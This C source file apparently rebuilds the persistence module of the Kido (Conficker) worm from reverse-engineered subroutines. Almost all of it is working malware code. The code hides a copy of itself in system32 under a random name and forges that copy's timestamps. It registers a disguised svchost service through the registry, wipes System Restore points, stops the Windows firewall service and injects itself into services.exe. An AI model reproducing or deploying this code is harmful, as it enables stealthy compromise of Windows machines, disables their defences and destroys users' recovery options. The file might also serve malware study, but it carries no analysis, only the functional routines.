/*====================================================================================
 *  KIDO worm - self-install and persistence (svchost "netsvcs" service).
 *  self_install (step 3), timestomp (sub_08054), install_service (sub_0927B ->
 *  sub_09099 -> sub_08F81 -> sub_08F2C), stop_service (sub_07F99),
 *  reset_system_restore (sub_08F2C), random_lowercase (sub_07FF2),
 *  inject_services_exe (sub_07CA0).
 *====================================================================================*/
#include "kido_worm.h"
#include <stdio.h>
#include <string.h>
#include <TlHelp32.h>
#include <tchar.h>

/* random_lowercase (sub_07FF2): len lowercase letters in a static buffer */
static char k_random_buf[64];
char* kido_random_lowercase(int len)
{
    if (len <= 0) len = 1;
    if (len >= (int)sizeof(k_random_buf)) len = (int)sizeof(k_random_buf)-1;
    for (int i=0;i<len;i++) k_random_buf[i] = (char)('a' + rand()%26);
    k_random_buf[len] = 0;
    return k_random_buf;
}

/* timestomp_from_kernel32 (sub_08054): copy kernel32.dll's file times onto dst */
void kido_timestomp_from_kernel32(const char* dst)
{
    char sysdir[260]; GetSystemDirectoryA(sysdir, sizeof(sysdir));
    char k32[320]; sprintf(k32, "%s\\kernel32.dll", sysdir);
    HANDLE hk = CreateFileA(k32, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hk == INVALID_HANDLE_VALUE) return;
    FILETIME ftCreate, ftAccess, ftWrite;
    GetFileTime(hk, &ftCreate, &ftAccess, &ftWrite);
    CloseHandle(hk);
    HANDLE hd = CreateFileA(dst, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hd == INVALID_HANDLE_VALUE) return;
    SetFileTime(hd, &ftCreate, &ftAccess, &ftWrite);
    CloseHandle(hd);
}

/* append <svc> to the svchost "netsvcs" REG_MULTI_SZ value (sub_08F81) */
static void kido_add_to_svchost_group(const char* svc)
{
    const wchar_t* KEY = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost";
    const wchar_t* VAL = L"netsvcs";
    HKEY hk;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, KEY, 0, KEY_READ|KEY_WRITE, &hk) != ERROR_SUCCESS)
        return;
    DWORD size = 0, type = 0;
    RegQueryValueExW(hk, VAL, NULL, &type, NULL, &size);
    size_t newsz = size + (strlen(svc)+2)*sizeof(wchar_t) + sizeof(wchar_t);
    uint8_t* buf = (uint8_t*)malloc(newsz);
    if (!buf){ RegCloseKey(hk); return; }
    memset(buf, 0, newsz);
    DWORD got = size;
    if (size) RegQueryValueExW(hk, VAL, NULL, NULL, buf, &got);
    wchar_t* cur = (wchar_t*)buf;
    while (*cur) cur++;                 /* skip to first null */
    if (*cur) cur++;                     /* move past the terminating null */
    for (const char* p=svc; *p; p++) *cur++ = (wchar_t)*p;
    *cur++ = 0; *cur = 0;
    RegSetValueExW(hk, VAL, 0, REG_MULTI_SZ, buf, (DWORD)newsz);
    free(buf);
    RegCloseKey(hk);
}

/* reset_system_restore (sub_08F2C): ResetSR(0) from srclient.dll */
void kido_reset_system_restore(void)
{
    HMODULE h = LoadLibraryA(S_SRCLIENT);
    if (!h) return;
    typedef BOOL (WINAPI* ResetSR_t)(DWORD);
    ResetSR_t reset = (ResetSR_t)GetProcAddress(h, S_RESETSR);
    if (reset) reset(0);
}

/* install_service (sub_0927B): register the svchost "netsvcs" service via the
   registry (no CreateService).  Random 5..9-letter name; ServiceDll = dllpath. */
void kido_install_service(const char* dllpath)
{
    static const wchar_t* W_TYPE   = L"Type";
    static const wchar_t* W_START  = L"Start";
    static const wchar_t* W_ERRCTL = L"ErrorControl";
    static const wchar_t* W_DISP   = L"DisplayName";
    static const wchar_t* W_OBJS   = L"ObjectName";
    static const wchar_t* W_PARAMS = L"Parameters";
    static const wchar_t* W_SDLL   = L"ServiceDll";
    static const wchar_t* W_IMAGE  = L"ImagePath";
    static const wchar_t W_IMGVAL[] = L"%SystemRoot%\\system32\\svchost.exe -k netsvcs";
    static const wchar_t W_LOCAL[]  = L"LocalSystem";
    static const wchar_t W_EMPTY[]  = L"";

    char svc[16]; strcpy_s(svc, sizeof(svc), kido_random_lowercase(5 + rand()%5));
    char keypath[64]; sprintf(keypath, "SYSTEM\\CurrentControlSet\\Services\\%s", svc);
    int kn = MultiByteToWideChar(CP_ACP,0,keypath,-1,NULL,0);
    wchar_t* kbuf = (wchar_t*)malloc(kn*sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP,0,keypath,-1,kbuf,kn);

    HKEY hk;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, kbuf, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hk, NULL) == ERROR_SUCCESS){
        DWORD dw;
        dw = 0x20; RegSetValueExW(hk, W_TYPE, 0, REG_DWORD, (const BYTE*)&dw, 4);
        dw = 2;    RegSetValueExW(hk, W_START, 0, REG_DWORD, (const BYTE*)&dw, 4);
        dw = 0;    RegSetValueExW(hk, W_ERRCTL, 0, REG_DWORD, (const BYTE*)&dw, 4);
        RegSetValueExW(hk, W_DISP, 0, REG_SZ, (const BYTE*)W_EMPTY, sizeof(wchar_t));
        RegSetValueExW(hk, W_IMAGE, 0, REG_EXPAND_SZ, (const BYTE*)W_IMGVAL, sizeof(W_IMGVAL));
        RegSetValueExW(hk, W_OBJS, 0, REG_EXPAND_SZ, (const BYTE*)W_LOCAL, sizeof(W_LOCAL));
        HKEY hsub;
        if (RegCreateKeyExW(hk, W_PARAMS, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hsub, NULL) == ERROR_SUCCESS){
            int dn = MultiByteToWideChar(CP_ACP,0,dllpath,-1,NULL,0);
            wchar_t* wbuf = (wchar_t*)malloc(dn*sizeof(wchar_t));
            MultiByteToWideChar(CP_ACP,0,dllpath,-1,wbuf,dn);
            RegSetValueExW(hsub, W_SDLL, 0, REG_EXPAND_SZ, (const BYTE*)wbuf, dn*sizeof(wchar_t));
            free(wbuf);
            RegCloseKey(hsub);
        }
        RegCloseKey(hk);
    }
    free(kbuf);

    kido_add_to_svchost_group(svc);
    kido_reset_system_restore();
}

/* self_install (step 3): copy the wrapper to system32\<5..8 letters>.dll,
   delete the original at reboot, timestomp the copy, register the service. */
void kido_self_install(void)
{
    char sysdir[260]; GetSystemDirectoryA(sysdir, sizeof(sysdir));
    char dst[320];
    sprintf(dst, "%s\\%s.dll", sysdir, kido_random_lowercase(5 + rand()%4));

    BOOL moved = MoveFileA(g_path, dst);
    if (!moved){
        if (!CopyFileA(g_path, dst, TRUE)) return;   /* give up */
        MoveFileExA(g_path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    }
    kido_timestomp_from_kernel32(dst);
    kido_install_service(dst);
    strncpy_s(g_path, sizeof(g_path), dst, _TRUNCATE);
}

/* stop_service (sub_07F99): stop the SharedAccess (Windows Firewall/ICS) service */
int kido_stop_service_sharedaccess(void)
{
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return 0;
    SC_HANDLE svc = OpenServiceA(scm, S_SHAREDACCESS, SERVICE_ALL_ACCESS);
    if (svc){
        SERVICE_STATUS ss;
        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return 1;
}

/* inject_services_exe (sub_07CA0): Windows 2000 only.  Find services.exe and make
   it LoadLibrary this DLL via a remote thread. */
static DWORD kido_find_process(const char* name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32First(snap, &pe)){
        do {
            if (_stricmp(pe.szExeFile, name) == 0){ pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}
void kido_inject_services_exe(void)
{
    DWORD pid = 0;
    for (int tries=0; tries<20; tries++){
        pid = kido_find_process(S_SERVICES_EXE);
        if (pid) break;
        Sleep(1000);
    }
    if (!pid) return;
    HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hproc) return;
    size_t sz = strlen(g_path) + 0x20;
    LPVOID remote = VirtualAllocEx(hproc, NULL, sz, MEM_COMMIT, PAGE_READWRITE);
    if (!remote){ CloseHandle(hproc); return; }
    WriteProcessMemory(hproc, remote, g_path, sz, NULL);
    HMODULE hk32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE ll = (LPTHREAD_START_ROUTINE)(BYTE*)GetProcAddress(hk32, "LoadLibraryA");
    CreateRemoteThread(hproc, NULL, 0, ll, remote, 0, NULL);
    VirtualFreeEx(hproc, remote, 0, MEM_RELEASE);
    CloseHandle(hproc);
}
